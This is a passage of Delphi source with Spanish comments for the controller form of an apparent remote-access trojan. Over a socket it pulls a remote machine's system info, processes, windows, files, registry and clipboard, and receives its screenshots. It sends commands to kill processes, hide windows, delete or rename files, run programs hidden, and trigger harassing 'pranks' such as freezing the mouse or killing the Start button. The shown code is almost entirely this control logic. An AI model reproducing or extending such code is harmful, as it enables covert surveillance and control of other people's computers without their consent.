unit UnitFormControl;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ComCtrls, XPMan, ImgList, Menus, ExtCtrls, StdCtrls, Buttons, ScktComp, Jpeg;

type
  TClientStatus = (CSIdle, CSReceivingFile);//Saber el estado de la screencap (para servir como interruptor)
  TFormControl = class(TForm)
    PageControl: TPageControl;
    TabInfo: TTabSheet;
    BtnRefrescarInformacion: TSpeedButton;
    ListViewInformacion: TListView;
    TabProcesos: TTabSheet;
    BtnRefrescarProcesos: TSpeedButton;
    ListViewProcesos: TListView;
    TabVentanas: TTabSheet;
    BtnRefrescarVentanas: TSpeedButton;
    ListViewVentanas: TListView;
    TabBromas: TTabSheet;
    BtnEnviarBromas: TSpeedButton;
    ListViewBromas: TListView;
    TabFileManager: TTabSheet;
    LabelPathArchivos: TLabel;
    LabelNumeroDeArchivos: TLabel;
    LabelNumeroDeCarpetas: TLabel;
    BtnActualizarArchivos: TSpeedButton;
    BtnVerUnidades: TSpeedButton;
    cmbUnidades: TComboBox;
    ListViewArchivos: TListView;
    EditPathArchivos: TEdit;
    TabRegistro: TTabSheet;
    LabelPathRegistro: TLabel;
    BtnVerRegisto: TSpeedButton;
    TreeViewRegedit: TTreeView;
    ListViewRegistro: TListView;
    EditPathRegistro: TEdit;
    Mensajes: TTabSheet;
    LabelMensaje: TLabel;
    LabelTituloMensaje: TLabel;
    MemoMensaje: TMemo;
    EditTituloMensaje: TEdit;
    GrpBoxTipoMensaje: TGroupBox;
    ImgError: TImage;
    ImgAsterisk: TImage;
    ImgWarning: TImage;
    ImgInfo: TImage;
    RdBtnError: TRadioButton;
    RdBtnPregunta: TRadioButton;
    RdBtnExclamacion: TRadioButton;
    RdBtnInfo: TRadioButton;
    RdBtnVacio: TRadioButton;
    RdGrpBotonesMensaje: TRadioGroup;
    TabScreencap: TTabSheet;
    btnGuardarImagen: TSpeedButton;
    imgCaptura: TImage;
    PosicionCompresJpg: TLabel;
    LabelCalidad: TLabel;
    ProgressBarScreen: TProgressBar;
    TrackBarCalidad: TTrackBar;
    DlgGuardar: TSaveDialog;
    PopupProcess: TPopupMenu;
    Cerrar1: TMenuItem;
    PopupWindows: TPopupMenu;
    Cerrar2: TMenuItem;
    Maximizar1: TMenuItem;
    Minimizar1: TMenuItem;
    Mostrar1: TMenuItem;
    Ocultar1: TMenuItem;
    Minimizartodas1: TMenuItem;
    BotnCerrarX1: TMenuItem;
    Activar1: TMenuItem;
    Desactivar1: TMenuItem;
    PopupFileManager: TPopupMenu;
    EjecutarAbrir1: TMenuItem;
    Normal1: TMenuItem;
    Oculto1: TMenuItem;
    Eliminar: TMenuItem;
    Cambiarnombre1: TMenuItem;
    Crearnuevacarpeta1: TMenuItem;
    PopupRegistro: TPopupMenu;
    Nuevo1: TMenuItem;
    Clave1: TMenuItem;
    N2: TMenuItem;
    Valoralfanumrico1: TMenuItem;
    Valorbinerio1: TMenuItem;
    valorDWORD1: TMenuItem;
    Valordecadenamltiple1: TMenuItem;
    N3: TMenuItem;
    N1: TMenuItem;
    Eliminar1: TMenuItem;
    PopupCapturarPantalla: TPopupMenu;
    VerenGrande1: TMenuItem;
    IconsArchivos: TImageList;
    XPManifest: TXPManifest;
    StatusBar: TStatusBar;
    BtnCapturarScreen: TSpeedButton;
    SpeedButton1: TSpeedButton;
    TabSheet1: TTabSheet;
    Memo1: TMemo;
    SpeedButton2: TSpeedButton;
    SpeedButton3: TSpeedButton;
    PopupMenuClip: TPopupMenu;
    Limpiar1: TMenuItem;
    procedure FormCreate(Sender: TObject);
    procedure BtnRefrescarProcesosClick(Sender: TObject);
    procedure BtnRefrescarVentanasClick(Sender: TObject);
    procedure cmbUnidadesSelect(Sender: TObject);
    procedure ListViewArchivosDblClick(Sender: TObject);
    procedure Cerrar1Click(Sender: TObject);
    procedure Cerrar2Click(Sender: TObject);
    procedure Maximizar1Click(Sender: TObject);
    procedure Minimizar1Click(Sender: TObject);
    procedure Mostrar1Click(Sender: TObject);
    procedure Ocultar1Click(Sender: TObject);
    procedure Minimizartodas1Click(Sender: TObject);
    procedure Normal1Click(Sender: TObject);
    procedure Oculto1Click(Sender: TObject);
    procedure EliminarClick(Sender: TObject);
    procedure Cambiarnombre1Click(Sender: TObject);
    procedure Crearnuevacarpeta1Click(Sender: TObject);
    procedure BtnRefrescarInformacionClick(Sender: TObject);
    procedure BtnActualizarArchivosClick(Sender: TObject);
    procedure BtnEnviarBromasClick(Sender: TObject);
    procedure BtnVerUnidadesClick(Sender: TObject);
    procedure TreeViewRegeditDblClick(Sender: TObject);
    procedure TreeViewRegeditChange(Sender: TObject; Node: TTreeNode);
    procedure BtnVerRegistoClick(Sender: TObject);
    procedure N1Click(Sender: TObject);
    procedure ListViewRegistroEdited(Sender: TObject; Item: TListItem;
      var S: String);
    procedure Eliminar1Click(Sender: TObject);
    procedure Valoralfanumrico1Click(Sender: TObject);
    procedure TreeViewRegeditContextPopup(Sender: TObject;
      MousePos: TPoint; var Handled: Boolean);
    procedure ListViewRegistroContextPopup(Sender: TObject;
      MousePos: TPoint; var Handled: Boolean);
    procedure Clave1Click(Sender: TObject);
    procedure ListViewArchivosContextPopup(Sender: TObject;
      MousePos: TPoint; var Handled: Boolean);
    procedure ListViewArchivosEdited(Sender: TObject; Item: TListItem;
      var S: String);
    procedure Valorbinerio1Click(Sender: TObject);
    procedure valorDWORD1Click(Sender: TObject);
    procedure Valordecadenamltiple1Click(Sender: TObject);
    procedure BtnEnviarMensajeClick(Sender: TObject);
    procedure Activar1Click(Sender: TObject);
    procedure Desactivar1Click(Sender: TObject);
    procedure TrackBarCalidadChange(Sender: TObject);
    procedure VerenGrande1Click(Sender: TObject);
    procedure btnGuardarImagenClick(Sender: TObject);
    procedure BtnCapturarScreen1Click(Sender: TObject);
    procedure SpeedButton2Click(Sender: TObject);
    procedure SpeedButton3Click(Sender: TObject);
    procedure Limpiar1Click(Sender: TObject);

  private  //Funciones y variables privadas que solo podemos usar en este Form
    Servidor: TCustomWinSocket;
    cstate: TClientStatus;
    TheFileSize: Integer;
    fs: TFileStream;
    function ObtenerRutaAbsolutaDeArbol(Nodo: TTreeNode): String;
    function IconNum(strExt: String): Integer;
    procedure AniadirClavesARegistro(Claves: String);
    procedure AniadirValoresARegistro(Valores: String);
  public  //Funciones públicas que podemos llamar desde otros Forms
    constructor Create(aOwner: TComponent; Socket: TCustomWinSocket);
    procedure OnRead(Socket: TCustomWinSocket);
  end;

var
  FormControl: TFormControl;

implementation

uses
  UnitMain, UnitFormReg, ScreenMaxCap;

{$R *.dfm}

constructor TFormControl.Create(aOwner: TComponent; Socket: TCustomWinSocket);
begin
  inherited Create(aOwner);
  Servidor := Socket;
end;

procedure TFormControl.FormCreate(Sender: TObject);
begin
  cstate:=CSIdle;
end;

procedure TFormControl.OnRead(Socket: TCustomWinSocket);
var
  Recibido, TempStr: String;
  Item: TListItem;
  i, a: Integer;
  ReceiveLen: Integer;
begin
  Socket := Servidor;
  SetLength(Recibido, Socket.ReceiveLength);
  ReceiveLen := Socket.ReceiveBuf(Recibido[1], Socket.ReceiveLength) ;
  Recibido := copy(Recibido, 1, ReceiveLen);

  if Recibido = 'PONG' then  //Tiempo actual menos almacenado
    //Primero buscar el item  del listview que corresponde a esta conexión
    for i :=0 to FormMain.ServerSocket.Socket.ActiveConnections - 1 do
     if HWND(FormMain.ListViewConexiones.Items[i].Subitems.Objects[0]) = Socket.Handle then
     begin
       //Restamos al valor actual, el valor de cuando hizimos PING que está guardado en el objeto 2
       FormMain.ListViewConexiones.Items[i].SubItems[4] := IntToStr(GetTickCount() - Cardinal(FormMain.ListViewConexiones.Items[i].SubItems.Objects[2]));
       exit;
     end;

  //Recibir una captura de pantalla
  if Pos('<FILEONWAY>', Recibido) = 1 then
  begin
    try
      FS := TFileStream.Create(ExtractFilePath(ParamStr(0)) + 'jpgcool.jpg', fmCreate or fmOpenWrite);
      TheFileSize := StrToInt( Copy(Recibido, 12, Pos('|', Recibido) -12 ));
      Delete(Recibido, 1, Pos('|', Recibido));
      ProgressBarScreen.Max := TheFileSize;
      CState := CSReceivingFile;
    except
      FS.Free;
    end;
  end;

  case CState of
    CSReceivingFile:
    begin
      try
        ProgressBarScreen.StepBy(Length(Recibido));
        FS.Write(recibido[1], Length(Recibido));
        Dec(TheFileSize, Length(Recibido));
        if TheFileSize = 0 then
        begin
          CState := CSIdle;
          ProgressBarScreen.Position := 0;
          FS.Free;
          Recibido := '';
          imgCaptura.Picture.LoadFromFile(ExtractFilePath(ParamStr(0)) + 'jpgcool.jpg')
        end;
      except
        MessageDlg('Error obteniendo captura de pantalla', mtError, [mbok], 0);
      end;
    end;
  end;
  //Fin recibir captura de pantalla

  //Recibimos la información principal del server, para mostrar en el ListViewConexiones
  if Copy(Recibido, 1, 8) = 'MAININFO' then
  begin
    Delete(Recibido, 1, 9);  //Borramos MAININFO|
    //Buscamos el item con el mismo Socket.Handle
    for i := 0 to FormMain.ListViewConexiones.Items.Count - 1 do
      if HWND(FormMain.ListViewConexiones.Items[i].SubItems.Objects[0]) = Socket.Handle then
        Item := FormMain.ListViewConexiones.Items[i];
    Item.Caption := Item.Caption + '/' + Copy(Recibido, 1, Pos('|', Recibido) - 1);
    for i := 0 to 3 do  //El resto de valores los copiamos tal cual
    begin
      Delete(Recibido, 1, Pos('|', Recibido));
      Item.SubItems[i] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
    end;
  end;

  if Copy(Recibido, 1, 4) = 'INFO' then
  begin
    i := 0;
    Delete(Recibido, 1, 5);  //Borramos INFO|
    while pos('|', Recibido) > 0 do
    begin
      If i > ListViewInformacion.Items.Count  Then break;
      ListViewInformacion.Items[i].SubItems.Text:= Copy(Recibido, 1, Pos('|', Recibido) - 1);
      Delete(Recibido, 1, Pos('|', Recibido));
      Inc(i);
    end;
  end;
  if Copy(Recibido, 1, 4) = 'PROC' then
  begin
    ListViewProcesos.Clear;
    Delete(Recibido, 1, 5);
    while pos('|', Recibido) > 0 do
    begin
      Item := ListViewProcesos.Items.Add;
      Item.Caption := Copy(Recibido, 1, Pos('|', Recibido) - 1);
      Delete(Recibido, 1, Pos('|', Recibido));
      Item.SubItems.Add(Copy(Recibido, 1, Pos('|', Recibido) - 1));
      Delete(Recibido, 1, Pos('|', Recibido));
      Item.SubItems.Add(Copy(Recibido, 1, Pos('|', Recibido) - 1));
      Delete(Recibido, 1, Pos('|', Recibido));
    end;
  end;
  if Copy(Recibido, 1, 4) = 'WIND' then
  begin
    ListViewVentanas.Clear;
    Delete(Recibido, 1, 5);
    while pos('|', Recibido) > 0 do
    begin
      Item := ListViewVentanas.Items.Add;
      Item.Caption := Copy(Recibido, 1, Pos('|', Recibido) - 1);
      Delete(Recibido, 1, Pos('|', Recibido));
      Item.SubItems.Add(Copy(Recibido, 1, Pos('|', Recibido) - 1));
      Delete(Recibido, 1, Pos('|', Recibido));
    end;
  end;

  if Copy(Recibido, 1, 3) = 'MSG' then
  begin
    Delete(Recibido, 1, 4);
    if Recibido = 'El directorio no existe!' then
    begin
      EditPathArchivos.Text := Copy(EditPathArchivos.Text, 1, Length(EditPathArchivos.Text) - 1); {Borra el ultimo '\'}
      EditPathArchivos.Text := Copy(EditPathArchivos.Text, 1, LastDelimiter('\', EditPathArchivos.Text));
    end;
    StatusBar.Panels[1].Text := Recibido;
    MessageBeep($FFFFFFFF); //Suena un ruidito..., para informar que hay que mirar la StatusBar :)
  end;

  if Copy(Recibido, 1, 15) = 'MOUSETEMBLOROSO' then
  begin
    Delete(Recibido, 1, 16); //Borra 'MOUSETEMBLOROSO|' de la string
    ListViewBromas.Items[0].SubItems[0] := Recibido;
                       // 0 porque es el primero en la ListViewBromas
  end;
  if Copy(Recibido, 1, 13) = 'CONGELARMOUSE' then
  begin
    Delete(Recibido, 1, 14); //Borra 'CONGELARMOUSE|' de la string
    ListViewBromas.Items[1].SubItems[0] := Recibido;
  end;
  if Copy(Recibido, 1, 7) = 'ABRIRCD' then
  begin
    Delete(Recibido, 1, 8); //Borra ''ABRIRCD|' de la string
    ListViewBromas.Items[2].SubItems[0] := Recibido;
  end;
  if Copy(Recibido, 1, 16) = 'MATARBOTONINICIO' then
  begin
    Delete(Recibido, 1, 17); //Borra 'MATARBOTONINICIO|' de la string
    ListViewBromas.Items[3].SubItems[0] := Recibido;
  end;

  if Copy(Recibido, 1, 11) = 'VERUNIDADES' then
  begin
    Delete(Recibido, 1, 12); //Borra 'VERUNIDADES|' de la string
    cmbUnidades.Items.Clear;
    while Pos('|', Recibido) > 1 do //Mayor que 1 porque hay un '|' al final de la cadena que se desprecia
    begin
      TempStr := Copy(Recibido, 1, (Pos('|', Recibido) - 1)); //Mete en TempStr todos los caracteres que haya de 1 a el char antes de '|'. Ejemplo: 'A:\2|C:\3|' se copiaría 'A:\2'
      Delete(Recibido, 1, Pos('|', Recibido)); //Borra lo que acaba de copiar
      case StrToInt(TempStr[4]) of //el último caracter
        0: cmbUnidades.Items.Add(UpperCase(Copy(TempStr,1,3)) + ' - Unidad desconocida');
        2: cmbUnidades.Items.Add(UpperCase(Copy(TempStr,1,3)) + ' - Unidad removible');
        3: cmbUnidades.Items.Add(UpperCase(Copy(TempStr,1,3)) + ' - Disco duro');
        4: cmbUnidades.Items.Add(UpperCase(Copy(TempStr,1,3)) + ' - Disco de red');
        5: cmbUnidades.Items.Add(UpperCase(Copy(TempStr,1,3)) + ' - Unidad de CD/DVD');
        6: cmbUnidades.Items.Add(UpperCase(Copy(TempStr,1,3)) + ' - Disc RAM');
      end;
    end;
    cmbUnidades.Enabled := True;
    EditPathArchivos.Enabled := True;
    BtnActualizarArchivos.Enabled := True;
  end;

  if Copy(Recibido, 1, 14) = 'LISTARARCHIVOS' then
  begin
    Delete(Recibido, 1, 15); //Borra 'LISTARARCHIVOS|'
    ListViewArchivos.Items.BeginUpdate;
    ListViewArchivos.Clear; //Limpia primero...
    if Length(EditPathArchivos.Text) > 3 then
    begin
      Item := ListViewArchivos.Items.Add;
      Item.ImageIndex := 0;
      Item.Caption := '<..>';
    end;
    while Pos('|', Recibido) > 1 do
    begin
      TempStr := Copy(Recibido, 1, (Pos('|', Recibido) - 1));
      Delete(Recibido, 1, Pos('|', Recibido)); //Borra lo que acaba de copiar
      if TempStr[1] = #2 then //entonces le llegó una carpeta
      begin
        Delete(TempStr, 1, 1); //borra el #2
        Item := ListViewArchivos.Items.Add;
        Item.ImageIndex := 1; //1 es el icono de carpeta cerrada
        Item.Caption := TempStr;
        Item.SubItems.Add('');
        Item.SubItems.Add('Carpeta de archivos');
        Item.SubItems.Add('');
      end
      else //entonces es un archivo, saque tambien la información extra...
      begin
        Item := ListViewArchivos.Items.Add;
        Item.ImageIndex := IconNum(LowerCase(ExtractFileExt(TempStr)));
        Item.Caption := TempStr;
        TempStr := Copy(Recibido, 1, (Pos('|', Recibido) - 1));
        Delete(Recibido, 1, Pos('|', Recibido)); //Borra lo que acaba de copiar
        Item.SubItems.Add(TempStr + 'Kb'); //agrega el tamaño
        TempStr := Copy(Recibido, 1, (Pos('|', Recibido) - 1));
        Delete(Recibido, 1, Pos('|', Recibido)); //Borra lo que acaba de copiar
        Item.SubItems.Add(TempStr); //agrega el tipo
        TempStr := Copy(Recibido, 1, (Pos('|', Recibido) - 1));
        Delete(Recibido, 1, Pos('|', Recibido)); //Borra lo que acaba de copiar
        Item.SubItems.Add(TempStr); //agrega la fecha
      end;
    end;
    if ListViewArchivos.Items.Count > 0 then
    begin
      //Aquí cuenta las carpetas para decir cuantas son
      a := 0;
      for i := 0 to ListViewArchivos.Items.Count - 1 do
      begin
        if ListViewArchivos.Items[i].ImageIndex = 1 then
          a := a + 1;
      end;
      LabelNumeroDeCarpetas.Caption := 'Carpetas: ' + IntToStr(a);
      //Aquí cuenta los archivos para decir cuantos son
      a := 0;
      for i := 0 to ListViewArchivos.Items.Count - 1 do
      begin
        if (ListViewArchivos.Items[i].ImageIndex <> 1) then //si no es una carpeta...
          a := a + 1;
       end;
      LabelNumeroDeArchivos.Caption := 'Archivos: ' + IntToStr(a);
    end;
    ListViewArchivos.Items.EndUpdate;
    StatusBar.Panels[1].Text := 'Archivos listados.';
  end;
  if Copy(Recibido, 1, 12) = 'LISTARCLAVES' then
  begin
    Delete(Recibido, 1, 13);
    AniadirClavesARegistro(Recibido);
  end;
  if Copy(Recibido, 1, 13) = 'LISTARVALORES' then
  begin
    Delete(Recibido, 1, 14);
    AniadirValoresARegistro(Recibido);
  end;

  If Copy(Recibido,1,12) = 'GETCLIPBOARD' then
  begin
       Delete(Recibido,1,13);
       Memo1.Text:= Recibido;
  end;


end;

function TFormControl.IconNum(strExt: String): Integer;
begin
  if (strExt = '.mp3') or (strExt = '.wav') or (strExt = '.ogg') or (strExt = '.midi') or (strExt = '.mid') or (strExt = '.cda')  then Result := 25
  else if (strExt = '.avi') or (strExt = '.mpg') or (strExt = '.mpeg') or (strExt = '.asf') or (strExt = '.wmv') or (strExt = '.mov') then Result := 25
  else if (strExt = '.jpg') or (strExt = '.jpeg') or (strExt = '.gif') or (strExt = '.png') or (strExt = '.pdf') then Result := 23
  else if (strExt = '.dll') or (strExt = '.sys') or (strExt = '.ocx') or (strExt = '.vxd') or (strExt = '.cpl') or(strExt = '.ini')  then Result := 24
  else if (strExt = '.txt') then Result := 6
  else if (strExt = '.html') or (strExt = '.htm') or (strExt = '.php') then Result := 9
  else if (strExt = '.exe') or (strExt = '.com') or (strExt = '.scr') then Result := 3
  else if (strExt = '.bat') or (strExt = '.cmd') then Result := 10
  else if (strExt = '.zip') or (strExt = '.rar') or (strExt = '.ace') then Result := 11
  else if (strExt = '.doc') or (strExt = '.rtf') then Result := 12
  else if (strExt = '.ppt') or (strExt = '.pps') then Result := 13
  else if (strExt = '.xls') or (strExt = '.xml') then Result := 14
  else if (strExt = '.bmp') or (strExt = '.ico') then Result := 26
  else Result := 2;
end;

//Boton obtener información
procedure TFormControl.BtnRefrescarInformacionClick(Sender: TObject);
begin
  if Servidor.Connected then
    Servidor.SendText('INFO')
  else
    MessageDlg('No estás conectado!', mtWarning, [mbok], 0);
end;

//Boton obtener procesos
procedure TFormControl.BtnRefrescarProcesosClick(Sender: TObject);
begin
  if Servidor.Connected then
    Servidor.SendText('PROC')
  else
    MessageDlg('No estás conectado!', mtWarning, [mbok], 0)
end;

//Item del popupmenu para cerrar un proceso
procedure TFormControl.Cerrar1Click(Sender: TObject);
begin
  if Servidor.Connected then
  begin
    if ListViewProcesos.Selected = nil then
      MessageDlg('Selecciona algún proceso para matar', mtWarning, [mbok], 0)
    else
      Servidor.SendText('KILLPROC|' + ListViewProcesos.Selected.SubItems[0]);
      Sleep(10);
      Servidor.SendText('PROC');
  end
  else
    MessageDlg('No estás conectado!', mtWarning, [mbok], 0)
end;

//Boton obtener ventanas
procedure TFormControl.BtnRefrescarVentanasClick(Sender: TObject);
begin
  if Servidor.Connected then
    Servidor.SendText('WIND')
  else
    MessageDlg('No estás conectado!', mtWarning, [mbok], 0);
end;

//Item del popupmenu para cerrar una ventana
procedure TFormControl.Cerrar2Click(Sender: TObject);
begin
  if Servidor.Connected then
  begin
    if ListViewVentanas.Selected = nil then
      MessageDlg('Selecciona alguna ventana', mtWarning, [mbok], 0)
    else
      Servidor.SendText('CLOSEWIN|' + ListViewVentanas.Selected.SubItems[0]);
  end
  else
    MessageDlg('No estás conectado!', mtWarning, [mbok], 0)
end;

//Item del popupmenu para maximizar una ventana
procedure TFormControl.Maximizar1Click(Sender: TObject);
begin
  if Servidor.Connected then
  begin
    if ListViewVentanas.Selected = nil then
      MessageDlg('Selecciona alguna ventana', mtWarning, [mbok], 0)
    else
      Servidor.SendText('MAXWIN|' + ListViewVentanas.Selected.SubItems[0]);
  end
  else
    MessageDlg('No estás conectado!', mtWarning, [mbok], 0)
end;

//Item del popupmenu para minimizar una ventana
procedure TFormControl.Minimizar1Click(Sender: TObject);
begin
  if Servidor.Connected then
  begin
    if ListViewVentanas.Selected = nil then
      MessageDlg('Selecciona alguna ventana', mtWarning, [mbok], 0)
    else
      Servidor.SendText('MINWIN|' + ListViewVentanas.Selected.SubItems[0]);
  end
  else
    MessageDlg('No estás conectado!', mtWarning, [mbok], 0)
end;

//Item del popupmenu para mostrar una ventana
procedure TFormControl.Mostrar1Click(Sender: TObject);
begin
  if Servidor.Connected then
  begin
    if ListViewVentanas.Selected = nil then
      MessageDlg('Selecciona alguna ventana', mtWarning, [mbok], 0)
    else
      Servidor.SendText('SHOWWIN|' + ListViewVentanas.Selected.SubItems[0]);
  end
  else
    MessageDlg('No estás conectado!', mtWarning, [mbok], 0)
end;

//Item del popupmenu para ocultar una ventana
procedure TFormControl.Ocultar1Click(Sender: TObject);
begin
  if Servidor.Connected then
  begin
    if ListViewVentanas.Selected = nil then
      MessageDlg('Selecciona alguna ventana', mtWarning, [mbok], 0)
    else
      Servidor.SendText('HIDEWIN|' + ListViewVentanas.Selected.SubItems[0]);
  end
  else
    MessageDlg('No estás conectado !', mtWarning, [mbok], 0)
end;

//Item del popupmenu para minimizar todas las ventanas
procedure TFormControl.Minimizartodas1Click(Sender: TObject);
begin
  if Servidor.Connected then
    Servidor.SendText('MINALLWIN')
  else
    MessageDlg('No estás conectado !', mtWarning, [mbok], 0)
end;

//Activar Botón cerrar [X] de una ventana
procedure TFormControl.Activar1Click(Sender: TObject);
begin
  if Servidor.Connected then
  begin
    if ListViewVentanas.Selected = nil then
      MessageDlg('Selecciona alguna ventana', mtWarning, [mbok], 0)
    else
      Servidor.SendText('BOTONCERRAR|SI|' + ListViewVentanas.Selected.SubItems[0]);
  end
  else
    MessageDlg('No estás conectado!', mtWarning, [mbok], 0)
end;

//Desactivar Botón cerrar [X] de una ventana
procedure TFormControl.Desactivar1Click(Sender: TObject);
begin
  if Servidor.Connected then
  begin
    if ListViewVentanas.Selected = nil then
      MessageDlg('Selecciona alguna ventana', mtWarning, [mbok], 0)
    else
      Servidor.SendText('BOTONCERRAR|NO|' + ListViewVentanas.Selected.SubItems[0]);
  end
  else
    MessageDlg('No estás conectado!', mtWarning, [mbok], 0)
end;


procedure TFormControl.BtnEnviarBromasClick(Sender: TObject);
var
  broma : string;
begin
  if Servidor.Connected then
  begin
    if ListViewBromas.Selected = nil then
      MessageDlg('Selecciona alguna broma', mtWarning, [mbok], 0)
    else
    begin
      case ListViewBromas.Selected.Index of //Selecciona la broma que se va a enviar
        0 : Broma := 'MOUSETEMBLOROSO';
        1 : Broma := 'CONGELARMOUSE';
        2 : Broma := 'ABRIRCD';
        3 : Broma := 'MATARBOTONINICIO';
      end;
      if ListViewBromas.Selected.SubItems[0] = 'Desactivado' then
      begin
        Servidor.SendText(Broma + '|Activar');
        if Broma = 'MOUSETEMBLOROSO' then
          ListViewBromas.Items[1].SubItems[0] := 'Desactivado'; // El mouse se descongela si se activa el congela mouse
        if Broma = 'CONGELARMOUSE' then
          ListViewBromas.Items[0].SubItems[0] := 'Desactivado'; //El mouse para de temblar si se congela
      end
      else  //Si esta activada
        Servidor.SendText(Broma + '|Desactivar');
    end;
  end
  else
    MessageDlg('No estás conectado !', mtWarning, [mbok], 0);
end;

//Funciones del FileManager
procedure TFormControl.BtnVerUnidadesClick(Sender: TObject);
begin
  if Servidor.Connected then
    Servidor.SendText('VERUNIDADES')
  else
    MessageDlg('No estás conectado!', mtWarning, [mbok], 0);
end;

procedure TFormControl.cmbUnidadesSelect(Sender: TObject);
begin
  if Servidor.Connected then
  begin
    Servidor.SendText('LISTARARCHIVOS|' + Copy(cmbUnidades.Text, 1, 3));//Manda 'LISTARARCHIVOS|C:\'
    EditPathArchivos.Text := Copy(cmbUnidades.Text, 1, 3);
  end
  else
    MessageDlg('No estás conectado!', mtWarning, [mbok], 0);
end;

procedure TFormControl.ListViewArchivosDblClick(Sender: TObject);
begin
  if ListViewArchivos.Selected = nil then
    MessageDlg('Dale doble click a una carpeta o a un archivo!', mtWarning, [mbok], 0)
  else
  begin
    if ListViewArchivos.Selected.Caption = '<..>' then
    begin
      EditPathArchivos.Text := Copy(EditPathArchivos.Text, 1, Length(EditPathArchivos.Text) - 1); //Borra el ultimo '\'
      EditPathArchivos.Text := Copy(EditPathArchivos.Text, 1, LastDelimiter('\', EditPathArchivos.Text));
      Servidor.SendText('LISTARARCHIVOS|' + EditPathArchivos.Text);
    end
    else if ListViewArchivos.Selected.ImageIndex = 1 then //doble-clickiò una carpeta
    begin
      ListViewArchivos.Selected.ImageIndex := 0;  //Icono de carpeta abierta
      EditPathArchivos.Text := EditPathArchivos.Text + ListViewArchivos.Selected.Caption + '\';
      Servidor.SendText('LISTARARCHIVOS|' + EditPathArchivos.Text);
    end
    else  //doble-clickiò un archivo
    begin
    end;
 end;
end;

//Función que se ejecuta justo antes de mostrarse el popupmenu para habilitar o deshabilitar submenus
procedure TFormControl.ListViewArchivosContextPopup(Sender: TObject;
  MousePos: TPoint; var Handled: Boolean);
begin
  if ListViewArchivos.Selected <> nil then //Algún item seleccionado
  begin
    if (ListViewArchivos.Selected.ImageIndex = 1) then  //Es una carpeta
      PopupFileManager.Items[0].Enabled := False  //No ejecutar
    else  //Viceversa
      PopupFileManager.Items[0].Enabled := True;
    PopupFileManager.Items[2].Enabled := True;  //Cambiar nombre
    PopupFileManager.Items[3].Enabled := True;  //Nueva carpeta
  end
  else  //Si no se ha seleccionado ningún item
  begin
    PopupFileManager.Items[0].Enabled := False; //Deshabilitar Ejecutar
    PopupFileManager.Items[1].Enabled := False; //Deshabilitar Eliminar
    PopupFileManager.Items[2].Enabled := False; //Deshabilitar Cambiar nombre
    if EditPathArchivos.Text = '' then  //Si no está en ningún Path deshabilitar crear carpeta
      PopupFileManager.Items[3].Enabled := False;
  end;
end;

procedure TFormControl.Normal1Click(Sender: TObject);
begin
  if Servidor.Connected then
    Servidor.SendText('EXEC|NORMAL|' + EditPathArchivos.Text + ListViewArchivos.Selected.Caption)
  else
    MessageDlg('No estás conectado!', mtWarning, [mbok], 0);
end;

procedure TFormControl.Oculto1Click(Sender: TObject);
begin
  if Servidor.Connected then
    Servidor.SendText('EXEC|OCULTO|' + EditPathArchivos.Text + ListViewArchivos.Selected.Caption)
  else
    MessageDlg('No estás conectado!', mtWarning, [mbok], 0);
end;

procedure TFormControl.EliminarClick(Sender: TObject);
begin
  if Servidor.Connected then
  begin
    if ListViewArchivos.Selected.ImageIndex = 1 then
    begin
      if MessageDlg('¿Está seguro que quiere borrar la carpeta ' + ListViewArchivos.Selected.Caption + '?', mtConfirmation, [MbYes, MBNo], 0) <> IdNo then
        Servidor.SendText('DELFOLDER|' + EditPathArchivos.Text + ListViewArchivos.Selected.Caption);
    end
    else
      if MessageDlg('¿Está seguro que quiere borrar el archivo ' + ListViewArchivos.Selected.Caption + '?', mtConfirmation, [MbYes, MBNo], 0) <> IdNo then
        Servidor.SendText('DELFILE|' + EditPathArchivos.Text + ListViewArchivos.Selected.Caption);
  end
  else
    MessageDlg('No estás conectado!', mtWarning, [mbok], 0);
end;

procedure TFormControl.Cambiarnombre1Click(Sender: TObject);
begin
  //Se pone el cursor de edición sobre el caption del item
  ListViewArchivos.Selected.EditCaption;
end;

procedure TFormControl.ListViewArchivosEdited(Sender: TObject;
  Item: TListItem; var S: String);
begin
  if Servidor.Connected then
  begin
    if S = '' then begin  S := Item.Caption; Exit; end;
    if (Pos('|', S) <> 0) or (Pos('*', S) <> 0) or (Pos('\', S) <> 0) or (Pos('/', S) <> 0) or (Pos(':', S) <> 0) or
       (Pos('?', S) <> 0) or (Pos('"', S) <> 0) or (Pos('<', S) <> 0) or (Pos('>', S) <> 0) then
    begin
      MessageDlg('Nombre de carpeta inválido. Una carpeta no puede tener ninguno de los siguientes carácteres: */\?"<>|', MtError, [mbOK], 0);
      S := Item.Caption; //Así evitamos que se cambie el nombre en el ListView
    end
    else
      Servidor.SendText('RENAME|' + EditPathArchivos.Text + ListViewArchivos.Selected.Caption + '|' + EditPathArchivos.Text + S);
    end
  else
    MessageDlg('No estás conectado!', mtWarning, [mbok], 0);
end;

procedure TFormControl.Crearnuevacarpeta1Click(Sender: TObject);
var
  DirName : string;
begin
  if Servidor.Connected then
  begin
    DirName := InputBox('Escriba el nombre para la nueva carpeta.', 'Crear nueva carpeta', 'Nueva carpeta');
    if DirName <> '' then
    begin
      if DirName[Length(DirName)] <> '\' then
        DirName := DirName + '\';
      Servidor.SendText('MKDIR|' + EditPathArchivos.Text + DirName);
    end;
  end
  else
    MessageDlg('No estás conectado!', mtWarning, [mbok], 0);
end;

procedure TFormControl.BtnActualizarArchivosClick(Sender: TObject);
begin
  if Length(EditPathArchivos.Text) <3 then
  begin
    MessageDlg('No escribiste un directorio válido.', mtWarning, [mbok], 0);
    exit;
  end;
  if EditPathArchivos.Text[Length(EditPathArchivos.Text)] <> '\' then
     EditPathArchivos.Text := EditPathArchivos.Text + '\';
  Servidor.SendText('LISTARARCHIVOS|' + EditPathArchivos.Text);
end;

//Obtiene la ruta completa del arbol padre\hijo\nieto\ xD
function TFormControl.ObtenerRutaAbsolutaDeArbol(Nodo: TTreeNode): String;
begin
  repeat
    Result := Nodo.Text + '\' + Result;
    Nodo := Nodo.Parent;
  until not Assigned(Nodo);
end;

procedure TFormControl.TreeViewRegeditChange(Sender: TObject;
  Node: TTreeNode);
begin
  if TreeViewRegedit.Selected <> nil then
  begin
    EditPathRegistro.Text := ObtenerRutaAbsolutaDeArbol(TreeViewRegedit.Selected);
    Servidor.SendText('LISTARVALORES|' + EditPathRegistro.Text);
  end;
end;

procedure TFormControl.TreeViewRegeditDblClick(Sender: TObject);
begin
  Servidor.SendText('LISTARCLAVES|' + EditPathRegistro.Text);
end;

